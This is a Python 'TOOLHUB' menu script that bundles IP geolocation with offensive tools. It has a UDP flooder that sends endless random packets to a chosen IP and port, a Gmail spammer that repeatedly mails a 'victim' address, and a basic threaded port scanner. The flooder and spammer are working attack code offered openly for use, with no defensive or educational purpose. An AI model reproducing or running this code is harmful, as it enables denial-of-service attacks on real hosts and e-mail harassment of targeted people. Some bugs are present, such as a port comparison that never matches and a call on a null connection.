import time, os, sys, ip2geotools, socket, random, smtplib, threading
from time import sleep
from ip2geotools.databases.noncommercial import DbIpCity
from sys import platform


toolhub = """
    
\033[0m                                   \033[33m ████████████████████████████
\033[0m                                   \033[33m ████████████████████████████
\033[0m ████████  ██████   ██████  ██     \033[33m ██  ███  █  ████  █      ███
\033[0m    ██    ██    ██ ██    ██ ██     \033[33m ██  ███  █  ████  █  ███  ██
\033[0m    ██    ██    ██ ██    ██ ██     \033[33m ██       █  ████  █      ███
\033[0m    ██    ██    ██ ██    ██ ██     \033[33m ██  ███  █  ████  █  ███  ██
\033[0m    ██     ██████   ██████  ███████\033[33m ██  ███  ██      ██      ███
\033[0m                                   \033[33m ████████████████████████████
\033[0m                                   \033[33m ████████████████████████████
\033[33m                           BY: STUGOTSZACH
"""

options = """
\033[33m[1] IP to Geolocation
\033[33m[2] IP Flooder
\033[33m[3] E-Mail Spammer
\033[33m[4] Simple port scanner
\033[33m[5] Exit
"""

loop = True
while loop:
    if platform == "linux" or platform == "linux2":
        os.system('clear')
    elif platform == "win32":
        os.system('cls')
    os.system('cls')
    print(toolhub)
    print(options)
    choice = input("\033[0mPick an option: ")
    if choice == "1":
        if platform == "linux" or platform == "linux2":
            os.system('clear')
        elif platform == "win32":
            os.system('cls')
        print(toolhub)
        ip = input("IP Address: ")
        response = DbIpCity.get(ip, api_key='free')
        print("IP: " + response.ip_address)
        sleep(1)
        print("City: " + response.city)
        sleep(1)
        print("Country: " + response.country)
        sleep(1)
        print("Region: " + response.region)
        sleep(3)
        loop = True
    elif choice == "2":
        if platform == "linux" or platform == "linux2":
            os.system('clear')
        elif platform == "win32":
            os.system('cls')
        print(toolhub)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        print('\033[33m' + "IP Address:")
        ip = input("")
        print('\033[33m' + "Port:")
        port = input("")
        sleep(1)
        print("To stop press CTLR C")
        sleep(3)
        sent = 0
        while True:
            try:
                sock.sendto(bytes, (ip,int(port)))
                sent = sent + 1
                print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
                if port == 65534:
                  port = 1
            except(KeyboardInterrupt):
                print('\033[0m' + "You're leaving now...")
                sleep(2)
                exit()
    elif choice == "3":
        if platform == "linux" or platform == "linux2":
            os.system('clear')
        elif platform == "win32":
            os.system('cls')
        print(toolhub)
        
        print('\033[33m' + "To use this tool you got to make a dummy account and turn on less secure apps!")
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        print('\033[33m' + "Dummy gmail address: ")
        gmail =input("")

        print('\033[33m' + "Password: ")
        password = input("")

        print('\033[33m' + "Victims Gmail: ")
        victim = input("")

        print('\033[33m' + "Message: ")
        message = input("")

        print('\033[33m' + "Number of emails to send: ")
        total = int(input(""))

        if platform == "linux" or platform == "linux2":
            os.system('clear')
        elif platform == "win32":
            os.system('cls')

        server.login(gmail,password)

        for i in range(int(total)):
            server.sendmail(gmail,victim,message)
        print("Sent!")
        sleep(2)
        loop = True
    elif choice == "4":
        if platform == "linux" or platform == "linux2":
            os.system('clear')
        elif platform == "win32":
            os.system('cls')
        print("Target address: ")
        target = input("")

        def portscan(port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            try:
                con = s.connect((target,port))
                
                print('\033[33m','Port :',port,"is open.")
                print('\033[0m' + "Press anything to continue")
                sleep(2)
                con.stop()
        
            except:
                pass
        
        try:
            r = 1 
            for x in range(1,100): 
                t = threading.Thread(target=portscan,kwargs={'port':r}) 
                r += 1     
                t.start()
        except:
            sleep(2)
            os.system('cls')
    elif choice == "5":
        exit()
